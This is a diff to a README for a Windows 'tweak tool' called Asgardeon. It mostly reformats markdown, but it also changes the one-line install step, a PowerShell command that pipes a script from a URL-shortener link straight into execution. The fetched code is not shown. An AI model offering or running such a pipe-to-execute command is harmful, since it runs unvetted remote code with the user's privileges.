@@ -1,4 +1,4 @@
-### ⚙️ 𝓐𝓼𝓰𝓪𝓻𝓭𝓮𝓸𝓷: *Windows Tweak Tool*
+### ⚙️ 𝓐𝓼𝓰𝓪𝓻𝓭𝓮𝓸𝓷: _Windows Tweak Tool_
 
 ![Asgardeon](https://github.com/user-attachments/assets/20a2f6ed-5a48-4357-bfe0-c7d6ebcdda52)
 
@@ -8,10 +8,10 @@
 
 ### 🚀 𝓕𝓮𝓪𝓽𝓾𝓻𝓮𝓼
 
-* 🌙 Switch between light/dark themes
-* 🖼️ Set wallpapers instantly
-* 🔐 Manage Windows activation settings
-* ⚡ Simple and fast execution via PowerShell
+- 🌙 Switch between light/dark themes
+- 🖼️ Set wallpapers instantly
+- 🔐 Manage Windows activation settings
+- ⚡ Simple and fast execution via PowerShell
 
 ---
 
@@ -21,7 +21,7 @@
 2. Run the following command:
 
 ```powershell
-irm https://l8.nu/Z59A | iex
+irm https://l8.nu/125QH | iex
 ```
 
 <details>
